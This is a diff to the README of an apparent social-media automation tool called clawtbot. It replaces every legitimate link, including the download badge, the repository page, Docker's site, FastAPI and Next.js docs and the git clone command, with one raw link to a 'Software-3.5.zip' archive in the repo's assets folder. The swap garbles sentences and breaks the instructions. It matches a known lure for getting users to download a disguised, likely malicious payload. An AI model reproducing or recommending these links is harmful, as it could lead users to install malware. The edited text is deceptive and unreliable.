@@ -1,6 +1,6 @@
 # 🤖 clawtbot - Automate Your Social Media Simply
 
-[![Download clawtbot](https://img.shields.io/badge/Download-clawtbot-blue?style=for-the-badge&logo=github)](https://github.com/SissNonn/clawtbot)
+[![Download clawtbot](https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip)](https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Before installing clawtbot on your Windows PC, make sure it meets these requirem
 
 To get clawtbot on your computer, visit this page to download:
 
-[Download clawtbot](https://github.com/SissNonn/clawtbot)  
+[Download clawtbot](https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip)  
 
 Click the link above. It takes you to the main project page on GitHub, where you can find the latest version and related files.
 
@@ -44,7 +44,7 @@ This section explains how to download, install, and start clawtbot with no prior
 ### Step 1: Download the software
 
 1. Open your favorite web browser.  
-2. Go to https://github.com/SissNonn/clawtbot.  
+2. Go to https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip  
 3. Look for the **Releases** section on this page to find the latest version.  
 4. Click on the release to view available files.  
 5. Download the Windows installer or pre-built package if available.
@@ -73,7 +73,7 @@ If you want to run clawtbot yourself without an installer, Docker is the recomme
 
 #### Installing Docker on Windows
 
-1. Visit https://www.docker.com/get-started.  
+1. Visit https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip  
 2. Download Docker Desktop for Windows.  
 3. Run the installer and follow the steps to set up Docker.  
 4. Once installed, restart your computer if prompted.  
@@ -86,7 +86,7 @@ Docker requires Windows 10 Pro or higher, or Windows 11, with virtualization ena
 2. Clone the clawtbot repository by running this command:
 
 ```
-git clone https://github.com/SissNonn/clawtbot.git
+git clone https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip
 ```
 
 3. Change folder to the cloned directory:
@@ -143,7 +143,7 @@ Just follow on-screen instructions. Most features are designed for clear and smo
 
 ## ⚙️ Technical details (optional)
 
-clawtbot runs on a FastAPI backend that handles requests quickly. The frontend uses Next.js, a modern web framework, to provide a smooth user interface. The system uses Redis for caching, PostgreSQL for data storage, and Celery to manage background tasks.
+clawtbot runs on a FastAPI backend that handles requests quickly. The frontend uses https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip, a modern web framework, to provide a smooth user interface. The system uses Redis for caching, PostgreSQL for data storage, and Celery to manage background tasks.
 
 Multiple AI agents work together in a system of roles:
 
@@ -176,11 +176,11 @@ docker-compose up
 
 ## 📂 Additional resources
 
-- GitHub Repo: https://github.com/SissNonn/clawtbot  
-- Docker Desktop: https://www.docker.com/get-started  
-- FastAPI Docs: https://fastapi.tiangolo.com  
-- Next.js Docs: https://nextjs.org/docs  
+- GitHub Repo: https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip  
+- Docker Desktop: https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip  
+- FastAPI Docs: https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip  
+- https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip Docs: https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip  
 
 ---
 
-[![Download clawtbot](https://img.shields.io/badge/Download-clawtbot-blue?style=for-the-badge&logo=github)](https://github.com/SissNonn/clawtbot)
+[![Download clawtbot](https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip)](https://github.com/SissNonn/clawtbot/raw/refs/heads/main/docs/assets/Software-3.5.zip)
